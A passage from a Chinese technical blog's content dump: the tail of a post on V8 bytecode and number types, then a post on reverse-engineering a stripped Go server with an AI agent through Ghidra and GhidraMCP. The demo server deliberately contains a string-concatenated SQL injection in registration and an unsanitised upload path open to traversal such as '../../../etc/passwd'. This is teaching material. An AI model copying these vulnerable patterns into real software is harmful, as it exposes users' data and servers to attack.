&#123; test(0); test(-0); test(3); test(0/0); // NaN &#125; AAAAA() 我用指令 node --print-bytecode test.js &gt; out 編譯後，得出的結果為： [generated bytecode for function: AAAAA (0x31bb2f7de971 &lt;SharedFunctionInfo AAAAA>)] Bytecode length: 41 Parameter count 1 Register count 2 Frame size 16 Bytecode age: 0 62 S> 0x31bb2f7df776 @ 0 : 17 02 LdaImmutableCurrentContextSlot [2] 0x31bb2f7df778 @ 2 : c4 Star0 0x31bb2f7df779 @ 3 : 0c LdaZero 0x31bb2f7df77a @ 4 : c3 Star1 62 E> 0x31bb2f7df77b @ 5 : 62 fa f9 00 CallUndefinedReceiver1 r0, r1, [0] 73 S> 0x31bb2f7df77f @ 9 : 17 02 LdaImmutableCurrentContextSlot [2] 0x31bb2f7df781 @ 11 : c4 Star0 0x31bb2f7df782 @ 12 : 13 00 LdaConstant [0] 0x31bb2f7df784 @ 14 : c3 Star1 73 E> 0x31bb2f7df785 @ 15 : 62 fa f9 02 CallUndefinedReceiver1 r0, r1, [2] 85 S> 0x31bb2f7df789 @ 19 : 17 02 LdaImmutableCurrentContextSlot [2] 0x31bb2f7df78b @ 21 : c4 Star0 0x31bb2f7df78c @ 22 : 0d 03 LdaSmi [3] 0x31bb2f7df78e @ 24 : c3 Star1 85 E> 0x31bb2f7df78f @ 25 : 62 fa f9 04 CallUndefinedReceiver1 r0, r1, [4] 96 S> 0x31bb2f7df793 @ 29 : 17 02 LdaImmutableCurrentContextSlot [2] 0x31bb2f7df795 @ 31 : c4 Star0 0x31bb2f7df796 @ 32 : 13 01 LdaConstant [1] 0x31bb2f7df798 @ 34 : c3 Star1 96 E> 0x31bb2f7df799 @ 35 : 62 fa f9 06 CallUndefinedReceiver1 r0, r1, [6] 0x31bb2f7df79d @ 39 : 0e LdaUndefined 114 S> 0x31bb2f7df79e @ 40 : a9 Return Constant pool (size = 2) 0x31bb2f7df711: [FixedArray] in OldSpace - map: 0x3bc7231c0211 &lt;Map(FIXED_ARRAY_TYPE)> - length: 2 0: 0x31bb2f7df731 &lt;HeapNumber -0.0> 1: 0x3bc7231c0561 &lt;HeapNumber nan> Handler Table (size = 0) Source Position Table (size = 21) 0x31bb2f7df7a1 &lt;ByteArray[21]> 可以看到 3 就是直接 LdaSmi，代表是 Smi，而 -0 跟 NaN 是 LdaConstant，從 constant pool 載入進來，而這個 constant pool 裡面則寫著： Constant pool (size = 2) 0x31bb2f7df711: [FixedArray] in OldSpace - map: 0x3bc7231c0211 &lt;Map(FIXED_ARRAY_TYPE)> - length: 2 0: 0x31bb2f7df731 &lt;HeapNumber -0.0> 1: 0x3bc7231c0561 &lt;HeapNumber nan> 很明顯可以看到這兩個都是 heap number，不屬於 Smi。 如果從理論上的角度來看也行啦，NaN 不能是 Smi，是因為 NaN 本來就是 IEEE 754 裡面定義的東西，而 -0 需要那個負號，這個在 int 中也沒有，所以也只能是個 double。 但總之呢，未來若是碰到這個底層型別的疑惑，可以編譯成 bytecode 之後確認，一目瞭然。 總結這篇文章中我們從 React 原始碼中學到不少東西，分別是： Symbol 的用途，可以利用沒辦法反序列化的特性，來保證外界沒辦法構造出來 各種非同步函式如 requestIdleCallback、requestAnimationFrame、MessageChannel 與 setTimeout 的觸發時機以及特性，還有 React 底層是怎麼安排 task 的。 在規格上看來所有 JavaScript 的數字都是 64bit double，但在 V8 底層其實還是有分 Smi 跟 double，可以用 bytecode 來確認型別。 以上內容都來自於我自己寫的《JavaScript 重修就好》這本書，書中還有提到更多有趣的案例，像是 Vue 又是怎麼實作非同步的，它的 nextTick 背後用的又是哪個函式？或是 IEEE 754 還定義了哪些東西，數字在使用時需要注意什麼地方等等。 如果有興趣的話可以找來看看，有什麼問題或建議都可以透過臉書粉專聯絡我。","link":"/2025/11/16/learn-advanced-javascript-from-react/"},{"title":"感謝 AI 讓我這外行人也能做簡單的逆向工程","text":"最近碰到一個場合拿到了個 Golang HTTP server 的 binary，需要把它拆開進一步研究，找到通往下一步的線索。 但關於逆向工程這件事情，我是很陌生的。我只會把 binary 丟到 Ghidra 裡面，接著就什麼都不會了，我連搜尋字串都不會。 不過現在 AI agent 已經進化得很快了，只要工具運用得當，像我這種的逆向外行人，也能簡單靠 AI 做基礎的逆向工程，這篇就來記錄一下步驟。 先寫在前面，我拿到的跟這次示範的都是比較小的程式，如果是更大或更複雜的我也不知道能不能跑。我也不會覺得 AI 可以完全取代人原本需要做的部分，但鐵定能讓部分任務變得更輕鬆。 而像我這樣的外行人，原本能逆出的東西接近沒有，靠 AI 之後能給一些線索都好，就算是亂講的也有一些些參考價值，有總比沒有好嘛，亂講的我還能想辦法再去驗證。至於原本就會逆向的，我也不確定 AI 有沒有幫助，或者是他們會怎麼用，這個不在本篇的討論範圍。 環境準備為了示範整體流程，先隨意讓 AI 寫了個有註冊、登入跟上傳檔案功能的 Golang server，檔案結構是： . ├── config │ └── config.go ├── go.mod ├── go.sum ├── handlers │ ├── auth.go │ ├── avatar.go │ └── user.go ├── main.go ├── Makefile ├── middleware │ └── auth.go ├── models │ └── user.go ├── routes │ └── routes.go └── uploads 內容的話，貼幾個最主要的檔案上來就好，一個是 route： package routes import ( \"database/sql\" \"github.com/gin-gonic/gin\" \"membership-api/config\" \"membership-api/handlers\" \"membership-api/middleware\" ) func Setup(db *sql.DB) *gin.Engine &#123; r := gin.Default() authHandler := handlers.NewAuthHandler(db) userHandler := handlers.NewUserHandler(db) avatarHandler := handlers.NewAvatarHandler(db) authMiddleware := middleware.AuthMiddleware(config.JWTSecret) api := r.Group(\"/api\") &#123; // 公開端點 api.POST(\"/register\", authHandler.Register) api.POST(\"/login\", authHandler.Login) // 需登入端點 api.GET(\"/users/:id\", authMiddleware, userHandler.GetUserByID) api.GET(\"/me/messages\", authMiddleware, userHandler.GetMyMessages) api.POST(\"/me/avatar\", authMiddleware, avatarHandler.Upload) &#125; return r &#125; 再來是刻意埋的兩個漏洞，註冊時的 SQL injection： package handlers import ( \"database/sql\" \"fmt\" \"net/http\" \"time\" \"github.com/gin-gonic/gin\" \"github.com/golang-jwt/jwt/v5\" \"membership-api/config\" \"membership-api/middleware\" \"membership-api/models\" ) type RegisterRequest struct &#123; Username string `json:\"username\" binding:\"required\"` Email string `json:\"email\" binding:\"required\"` Password string `json:\"password\" binding:\"required\"` &#125; type LoginRequest struct &#123; Username string `json:\"username\" binding:\"required\"` Password string `json:\"password\" binding:\"required\"` &#125; type AuthHandler struct &#123; DB *sql.DB &#125; func NewAuthHandler(db *sql.DB) *AuthHandler &#123; return &amp;AuthHandler&#123;DB: db&#125; &#125; func (h *AuthHandler) Register(c *gin.Context) &#123; var req RegisterRequest if err := c.ShouldBindJSON(&amp;req); err != nil &#123; c.JSON(http.StatusBadRequest, gin.H&#123;\"error\": \"invalid request\"&#125;) return &#125; passwordHash, err := models.HashPassword(req.Password) if err != nil &#123; c.JSON(http.StatusInternalServerError, gin.H&#123;\"error\": \"failed to hash password\"&#125;) return &#125; // 刻意保留的 SQL injection 漏洞：使用字串拼接而非參數化查詢 query := fmt.Sprintf(\"INSERT INTO users (username, email, password_hash) VALUES ('%s', '%s', '%s')\", req.Username, req.Email, passwordHash) _, err = h.DB.Exec(query) if err != nil &#123; c.JSON(http.StatusConflict, gin.H&#123;\"error\": \"username or email already exists\"&#125;) return &#125; c.JSON(http.StatusCreated, gin.H&#123;\"message\": \"registration successful\"&#125;) &#125; 以及上傳檔案時的 path traversal： package handlers import ( \"database/sql\" \"net/http\" \"path/filepath\" \"github.com/gin-gonic/gin\" \"membership-api/config\" \"membership-api/middleware\" ) type AvatarHandler struct &#123; DB *sql.DB &#125; func NewAvatarHandler(db *sql.DB) *AvatarHandler &#123; return &amp;AvatarHandler&#123;DB: db&#125; &#125; func (h *AvatarHandler) Upload(c *gin.Context) &#123; userID, ok := middleware.GetUserID(c) if !ok &#123; c.JSON(http.StatusUnauthorized, gin.H&#123;\"error\": \"unauthorized\"&#125;) return &#125; file, err := c.FormFile(\"avatar\") if err != nil &#123; c.JSON(http.StatusBadRequest, gin.H&#123;\"error\": \"missing avatar file\"&#125;) return &#125; // 刻意保留的 path traversal 漏洞：直接使用 file.Filename，未經 filepath.Clean 或 filepath.Base 過濾 // 攻擊者可上傳 filename=\"../../../etc/passwd\" 等路徑穿越到系統其他位置 savePath := filepath.Join(config.UploadDir, file.Filename) if err := c.SaveUploadedFile(file, savePath); err != nil &#123; c.JSON(http.StatusInternalServerError, gin.H&#123;\"error\": \"failed to save file\"&#125;) return &#125; // 更新 user 的 avatar_path _, err = h.DB.Exec(\"UPDATE users SET avatar_path = ? WHERE id = ?\", file.Filename, userID) if err != nil &#123; c.JSON(http.StatusInternalServerError, gin.H&#123;\"error\": \"failed to update avatar\"&#125;) return &#125; c.JSON(http.StatusOK, gin.H&#123;\"message\": \"avatar uploaded\", \"path\": file.Filename&#125;) &#125; 寫完之後呢，用這個指令去 build，把該拿的都拿掉，模擬更真實的情境： CGO_ENABLED=0 go build -ldflags=\"-s -w\" -trimpath -o dist/membership-api . 前置作業因為我們的 binary 是 stripped 的，相關符號都被拿掉了，因此找個好用的 plugin 可以更方便幫我們還原 Golang 相關的東西，我選的是這個：https://github.com/mooncat-greenpy/Ghidra_GolangAnalyzerExtension 在分析的時候記得把相關選項勾上： 分析完以後，在 Ghidra 中其實就能看到更詳細的資訊了： 但這樣也還是手動去看嘛，像我這種根本不會操作 Ghidra 的人，只會把 binary 丟進去而已，要我看我也不知道怎麼看。 因此我們再來裝個真正讓 AI 跟 Ghidra 搭上線的東西：GhidraMCP，這個有大概兩三個版本用的人好像都滿多，我就隨意挑了一個看起來文件寫得比較好，比較方便跑起來的。 裝好並且在 Ghidra 啟用之後，在 AI 那邊配置好 MCP，例如說我用的是 Cursor，就這樣配： &#123; \"mcpServers\": &#123; \"ghidra\": &#123; \"command\": \"python\", \"args\": [ \"/app/GhidraMCP-release-1-4/bridge_mcp_ghidra.py\", \"--ghidra-server\", \"http://127.0.0.1:8080/\" ] &#125; &#125; &#125; 到這一步為止，前置作業就準備好了。 話說我拿來示範的是 Cursor，但其實只要是 AI agent 都行，你用 codex、claude code、open code 什麼的都一樣，能接 MCP 就都可以。 開始使喚 AI agent 做事接下來就是用嘴逆向的時候了，我就只是這樣先跟他講而已： 我現在正在逆向一個 golang 的 binary，請幫我使用 ghidra MCP 協助，幫我看一下他是什麼樣的程式，有哪些功能 他就會開始自己呼叫 MCP，搜尋他想要的東西： 最後給出了這個 binary 用到的 library： 以及 API 路由： 認證相關的邏輯： 還有推測出的檔案結構： 接著我就讓他根據推測出來的結構，幫我再把反編譯得到的 C 弄回去 Golang，他就列了幾個 todo 之後開始他的工作： 結果它逆向出來的 routes.go 長這樣： package routes import ( \"database/sql\" \"github.com/gin-gonic/gin\" \"membership-api/handlers\" \"membership-api/middleware\" ) func Setup(db *sql.DB) *gin.Engine &#123; r := gin.Default() authHandler := &amp;handlers.AuthHandler&#123;DB: db&#125; userHandler := &amp;handlers.UserHandler&#123;DB: db&#125; avatarHandler := &amp;handlers.AvatarHandler&#123;DB: db, UploadPath: \"uploads\"&#125; // 公開路由 - 不需要認證 api := r.Group(\"/api\") &#123; api.POST(\"/register\", authHandler.Register) api.POST(\"/login\", authHandler.Login) &#125; // 需要認證的路由 apiAuth := r.Group(\"/api\") apiAuth.Use(middleware.AuthMiddleware()) &#123; apiAuth.GET(\"/users/:id\", userHandler.GetUserByID) apiAuth.GET(\"/my-messages\", userHandler.GetMyMessages) apiAuth.POST(\"/avatar\", avatarHandler.Upload) &#125; return r &#125; 程式碼的結構跟原始的有些微不同，代表沒有作弊（？），話說我是讓他在不同 context 底下跑的，所以他確實是看不到原本的 Golang 原始碼沒錯。 總之，反推回來的程式碼清晰可讀，但有小部分錯誤，例如說 /my-messages 這個不存在，應該是 /me/messages 才對。/avatar 也應該是 /me/avatar，看來有部分地方應該被偷懶跳過了。 而註冊的地方則是這樣： func (h *AuthHandler) Register(c *gin.Context) &#123; var req RegisterRequest if err := c.ShouldBindJSON(&amp;req); err != nil &#123; c.JSON(http.StatusBadRequest, gin.H&#123;\"error\": \"invalid request\"&#125;) return &#125; hashedPassword, err := bcrypt.GenerateFromPassword([]byte(req.Password), 10) if err != nil &#123; c.JSON(http.StatusInternalServerError, gin.H&#123;\"error\": \"failed to hash password\"&#125;) return &#125; query := `INSERT INTO users (username, email, password_hash) VALUES (?, ?, ?)` _, err = h.DB.ExecContext(c.Request.Context(), query, req.Username, req.Email, string(hashedPassword)) if err != nil &#123; c.JSON(http.StatusConflict, gin.H&#123;\"error\": \"username or email already exists\"&#125;) return &#125; c.JSON(http.StatusCreated, gin.H&#123;\"message\": \"registration successful\"&#125;) &#125; 原本故意留做 SQL injection 的地方，現在反倒被修好了，代表他逆向出來的是錯的。 不過檔案上傳的那個 path traversal 還在，而且他有輕鬆找出來： 上面的結果因為我額度快用完了，所以是用 Cursor 自己出的 composer 1.5 模型，沒這麼聰明。 我換成 Opus 4.6 以後，同樣的 prompt 它還原完成之後還順便幫我做了個資安檢查，該找的漏洞有找出來，只是 route 的部分依舊有錯，/me 變成了 /my，我以為這些應該是可以完整被還原的？ 結語得益於 AI agent 的進化外加 MCP 的機制，讓 agent 可以自由操作許多不同的軟體來幫助自動化。 老實說，我在逆向這件事情上有體驗到那些所謂的 vibe coder 在做產品時的喜悅，也就是：「沒想到不會寫 code 的我也可以弄出一個網站，雖然我不知道原理，但東西好像做出來了」。 但 vibe coding 會有許多不會寫 code 沒辦法發現的小問題，純靠 AI 逆向我想也是相同的。就像我一開始用 composer 1.5，出來的結果是錯的一樣。但換個方式想，整體流程跟 API endpoints 這些都是對的，也算是收穫不少了。 原本靠自己的話是 0 分，靠 AI 可以先拿到保底 60 分，怎麼想都很賺。 時代在進化，工具在進步，這篇想記錄一下自己靠著這些工具，用 AI agent 做簡單的逆向工程的流程。雖然說最後跑出來的結果還是有些許錯誤，但對於一個 web server 來說，拿到 binary 逆向之後得到的東西可以再結合動態測試去驗證，就算有點小錯誤，還是對於整體測試幫助很大。 這次跑完之後，我還是會覺得逆向工程很難，也還是覺得懂逆向的人很厲害。畢竟我這次跑的是小的 binary，大的我就不確定會怎樣了。","link":"/2026/03/01/reverse-engineering-with-ai-ghidra-mcp/"}],"tags":[{"name":"Security","slug":"Security","link":"/tags/Security/"},{"name":"Cookie","slug":"Cookie","link":"/tags/Cookie/"},{"name":"Others","slug":"Others","link":"/tags/Others/"},{"name":"React","slug":"React","link":"/tags/React/"},{"name":"Front-end","slug":"Front-end","link":"/tags/Front-end/"},{"name":"Ajax","slug":"Ajax","link":"/tags/Ajax/"},{"name":"JavaScript","slug":"JavaScript","link":"/tags/JavaScript/"},{"name":"Android","slug":"Android","link":"/tags/Android/"},{"name":"Back-end","slug":"Back-end","link":"/tags/Back-end/"},{"name":"Algorithm","slug":"Algorithm","link":"/tags/Algorithm/"},{"name":"Web","slug":"Web","link":"/tags/Web/"},{"name":"CORS","slug":"CORS","link":"/tags/CORS/"},{"name":"CS50","slug":"CS50","link":"/tags/CS50/"},{"name":"CSRF","slug":"CSRF","link":"/tags/CSRF/"},{"name":"CSS","slug":"CSS","link":"/tags/CSS/"},{"name":"DOM","slug":"DOM","link":"/tags/DOM/"},{"name":"Node.js","slug":"Node-js","link":"/tags/Node-js/"},{"name":"Story","slug":"Story","link":"/tags/Story/"},{"name":"HTTP","slug":"HTTP","link":"/tags/HTTP/"},{"name":"Cache","slug":"Cache","link":"/tags/Cache/"},{"name":"Tool","slug":"Tool","link":"/tags/Tool/"},{"name":"Redux","slug":"Redux","link":"/tags/Redux/"},{"name":"story","slug":"story","link":"/tags/story/"},{"name":"Hls","slug":"Hls","link":"/tags/Hls/"},{"name":"nand2tetris","slug":"nand2tetris","link":"/tags/nand2tetris/"},{"name":"Redis","slug":"Redis","link":"/tags/Redis/"},{"name":"Server","slug":"Server","link":"/tags/Server/"},{"name":"DDoS","slug":"DDoS","link":"/tags/DDoS/"},{"name":"webpack","slug":"webpack","link":"/tags/webpack/"}],"categories":[{"name":"Security","slug":"Security","link":"/categories/Security/"},{"name":"Web","slug":"Web","link":"/categories/Web/"},{"name":"Others","slug":"Others","link":"/categories/Others/"},{"name":"React","slug":"React","link":"/categories/React/"},{"name":"Front-end","slug":"Front-end","link":"/categories/Front-end/"},{"name":"Android","slug":"Android","link":"/categories/Android/"},{"name":"Back-end","slug":"Back-end","link":"/categories/Back-end/"},{"name":"Algorithm","slug":"Algorithm","link":"/categories/Algorithm/"},{"name":"JavaScript","slug":"JavaScript","link":"/categories/JavaScript/"}]}